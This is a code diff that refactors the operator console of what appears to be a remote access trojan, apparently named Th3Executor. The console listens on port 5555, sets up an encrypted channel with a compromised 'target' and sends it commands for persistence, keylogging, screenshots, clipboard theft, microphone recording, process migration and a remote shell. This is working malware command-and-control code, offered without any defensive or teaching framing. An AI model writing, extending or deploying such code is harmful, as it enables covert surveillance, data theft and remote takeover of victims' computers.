@@ -16,6 +16,12 @@ from components.logging import configure_logging, log_activity
 import ascii_art
 import subprocess
 
+# Global symmetric key used for encryption helpers
+symmetric_key = b""
+
+# Default port for the listener
+port = 5555  # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
+
 def intro_banner():
     banner = colored(ascii_art.oberon_main_banner_1, "red", attrs=["bold"])
     intro_msg = colored("\nSilence the Noise, Amplify the Impact\n", attrs=["bold"])
@@ -326,6 +332,7 @@ def handle_reconnections(port, conn_obj):
 
 def connect_target(port):
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Bind the socket to avaliable interface on the specified port
     listener.bind(('0.0.0.0', port))
@@ -336,6 +343,7 @@ def connect_target(port):
 
     # Accept a connection when the client connects
     conn_obj, addr = listener.accept()
+    listener.close()
 
     return conn_obj
 
@@ -631,121 +639,154 @@ def disconnect_target(conn_obj, shutdown_signal):
         print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
         
         log_activity("Unknown shutdown code retireved, unable to parse output. Connection is probably still open.", "error")
-    
-# Required Variables
-port = 5555 # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
 
-# Th3Executor Banner    
-intro_banner()
 
-# Configure th3executor logger
-configure_logging()
+def main():
+    global symmetric_key
+    shutdown_signal = None
+    conn_obj = None
+    intro_banner()
+    configure_logging()
 
-# Listen for connections from target
-try:
-    conn_obj = connect_target(port) 
-except Exception as err:
-    exit(colored(f"[-] Unable to connect to target : {err}", "red"))
-    
-conn_obj.settimeout(10)  # Set global timeout value
-    
-print(colored("[+] Connected to target", "green", attrs=["bold"]))
-log_activity(f"Session started with target on port {port}.", "info")
-
-# Create required variables to create a secure channel
-print("[!] Establishing a secure connection ...")
-symmetric_key = attempt_exchange(conn_obj)
-if symmetric_key is None: 
-    log_activity("Failed to establish a symmetric key with the client during the Diffie-Hellman exchange. Check network conditions and client configurations.", "error")
-    conn_obj.close() # Close connection due to unsecured reasons
-    exit()
-    
-print(colored("[+] Secure channel established","green", attrs=["bold"]))
-log_activity("Key exchange completed, a secure channel has now been created.", "info")
-
-# Commands application can use
-commands = ["kill", "help", "persist", "del_persist", "keylog_start", "screenshot", "sys_info", "shell", "migrate", "clipboard_steal", "mic_record"]
-print_help_menu(commands)
-
-while True:
     try:
-        command = input(colored("\nMagic Keyword > ", attrs=["bold"])).strip().lower()
-    except KeyboardInterrupt:
-        log_activity("User interrupted program with a keyboard interrupt.", "info")
-        break
-    
-    # Basic commands
-    if command not in commands:
-        print("Invalid Command! Refer to help menu")
-        continue
-    elif command == "help":
+        conn_obj = connect_target(port)
+        conn_obj.settimeout(10)
+        print(colored("[+] Connected to target", "green", attrs=["bold"]))
+        log_activity(f"Session started with target on port {port}.", "info")
+
+        print("[!] Establishing a secure connection ...")
+        symmetric_key = attempt_exchange(conn_obj)
+        if symmetric_key is None:
+            log_activity(
+                "Failed to establish a symmetric key with the client during the Diffie-Hellman exchange. Check network conditions and client configurations.",
+                "error",
+            )
+            return
+
+        print(colored("[+] Secure channel established", "green", attrs=["bold"]))
+        log_activity("Key exchange completed, a secure channel has now been created.", "info")
+
+        commands = [
+            "kill",
+            "help",
+            "persist",
+            "del_persist",
+            "keylog_start",
+            "screenshot",
+            "sys_info",
+            "shell",
+            "migrate",
+            "clipboard_steal",
+            "mic_record",
+        ]
         print_help_menu(commands)
-        continue
-    elif command == "kill":
-        conn_obj.sendall(encrypt_message(command))
-        conn_obj.settimeout(5)
-        shutdown_signal = decrypt_message(conn_obj.recv(4096)).decode()
-        if shutdown_signal == "retry":
-            conn_obj.sendall(encrypt_message(command))
-            shutdown_signal = decrypt_message(conn_obj.recv(4096))
-        break
-    
-    # Send command to target and recieve response
-    try:
-        conn_obj.sendall(encrypt_message(command))
-        client_output = conn_obj.recv(4096).strip()
-        if decrypt_message(client_output).decode() == "retry":
-            conn_obj.sendall(encrypt_message(command))
-            client_output = conn_obj.recv(4096).strip()
-        
-        if "No information gathered" in decrypt_message(client_output).decode() or decrypt_message(client_output).decode() is None:
-            print(f"[-] No information recieved from target when initiating command {command}")
-            continue
-    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
-        if handle_reconnections(port, conn_obj) is None:
-            log_activity("Unable to establish a secure connection with the target. Exiting application due to critical network failure.", "error") 
-            exit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
-        conn_obj.settimeout(10)  # Redefine global timeout value
-        continue
-    except (socket.timeout, TimeoutError):
-        print(colored("[-] Timeout reached, skipping data . . .", "red"))
-        log_activity("Timeout reached when trying to recieve data from target, data was skipped.", "debug")
-        continue
-    except:
-        print(colored("[-] An unknown error has occured, skipping data", "red"))
-        
-    output = None
-    try:
-        if command == "sys_info":
-            output = sys_info_command(client_output)
-        elif command == "persist":
-            output = persist_command(client_output)
-        elif command == "del_persist":
-            output = persist_del_command(client_output)
-        elif command == "screenshot":
-            output = screenshot_command(client_output, conn_obj)
-        elif command == "clipboard_steal":
-            output = clipboard_steal_command(client_output, conn_obj)
-        elif command == "shell":
-            output = shell_load(client_output, conn_obj)
-    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
-        log_activity("Connection with target and server has been dropped.", "debug")
-        if handle_reconnections(port, conn_obj) is None: 
-            log_activity("Unable to re-connect with target, either the symmetric key was not established or the target refused to connect.", "error")
-            exit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
-        else:
-            log_activity("Connection re-established with target, new encyrption keys have also been created.", "info")
-            conn_obj.settimeout(10)  # Redefine global timeout value
-            continue
-    except:
-        output = None
-    finally:
-        if output is None or output == "No information gathered":
-            print(colored("[-] Unable to recieve data from target, skipping", "red"))
-            log_activity("Data recieved from target contains no information or server is unable to parse information recieved from target.", "debug")
-        else:
-            log_activity(f"Initiated command '{command}' to target which was executed successfully.", "info")
-            print(output)
 
-disconnect_target(conn_obj, shutdown_signal)
-print(colored("\n[+] Program Ended - Come back another time", "yellow", attrs=["bold"]))
+        while True:
+            try:
+                command = input(colored("\nMagic Keyword > ", attrs=["bold"])).strip().lower()
+            except KeyboardInterrupt:
+                log_activity("User interrupted program with a keyboard interrupt.", "info")
+                break
+
+            if command not in commands:
+                print("Invalid Command! Refer to help menu")
+                continue
+            elif command == "help":
+                print_help_menu(commands)
+                continue
+            elif command == "kill":
+                conn_obj.sendall(encrypt_message(command))
+                conn_obj.settimeout(5)
+                shutdown_signal = decrypt_message(conn_obj.recv(4096)).decode()
+                if shutdown_signal == "retry":
+                    conn_obj.sendall(encrypt_message(command))
+                    shutdown_signal = decrypt_message(conn_obj.recv(4096))
+                break
+
+            try:
+                conn_obj.sendall(encrypt_message(command))
+                client_output = conn_obj.recv(4096).strip()
+                if decrypt_message(client_output).decode() == "retry":
+                    conn_obj.sendall(encrypt_message(command))
+                    client_output = conn_obj.recv(4096).strip()
+
+                if "No information gathered" in decrypt_message(client_output).decode() or decrypt_message(client_output).decode() is None:
+                    print(f"[-] No information recieved from target when initiating command {command}")
+                    continue
+            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
+                if handle_reconnections(port, conn_obj) is None:
+                    log_activity(
+                        "Unable to establish a secure connection with the target. Exiting application due to critical network failure.",
+                        "error",
+                    )
+                    return
+                conn_obj.settimeout(10)
+                continue
+            except (socket.timeout, TimeoutError):
+                print(colored("[-] Timeout reached, skipping data . . .", "red"))
+                log_activity(
+                    "Timeout reached when trying to recieve data from target, data was skipped.",
+                    "debug",
+                )
+                continue
+            except Exception as err:
+                print(colored(f"[-] An unknown error has occured, skipping data: {err}", "red"))
+                continue
+
+            output = None
+            try:
+                if command == "sys_info":
+                    output = sys_info_command(client_output)
+                elif command == "persist":
+                    output = persist_command(client_output)
+                elif command == "del_persist":
+                    output = persist_del_command(client_output)
+                elif command == "screenshot":
+                    output = screenshot_command(client_output, conn_obj)
+                elif command == "clipboard_steal":
+                    output = clipboard_steal_command(client_output, conn_obj)
+                elif command == "shell":
+                    output = shell_load(client_output, conn_obj)
+            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
+                log_activity("Connection with target and server has been dropped.", "debug")
+                if handle_reconnections(port, conn_obj) is None:
+                    log_activity(
+                        "Unable to re-connect with target, either the symmetric key was not established or the target refused to connect.",
+                        "error",
+                    )
+                    return
+                else:
+                    log_activity(
+                        "Connection re-established with target, new encyrption keys have also been created.",
+                        "info",
+                    )
+                    conn_obj.settimeout(10)
+                    continue
+            except Exception:
+                output = None
+            finally:
+                if output is None or output == "No information gathered":
+                    print(colored("[-] Unable to recieve data from target, skipping", "red"))
+                    log_activity(
+                        "Data recieved from target contains no information or server is unable to parse information recieved from target.",
+                        "debug",
+                    )
+                else:
+                    log_activity(
+                        f"Initiated command '{command}' to target which was executed successfully.",
+                        "info",
+                    )
+                    print(output)
+
+    except Exception as err:
+        print(colored(f"[-] Unexpected error: {err}", "red"))
+        log_activity(f"Unexpected error: {err}", "error")
+    finally:
+        if conn_obj:
+            disconnect_target(conn_obj, shutdown_signal)
+        print(colored("\n[+] Program Ended - Come back another time", "yellow", attrs=["bold"]))
+
+
+if __name__ == "__main__":
+    main()
+
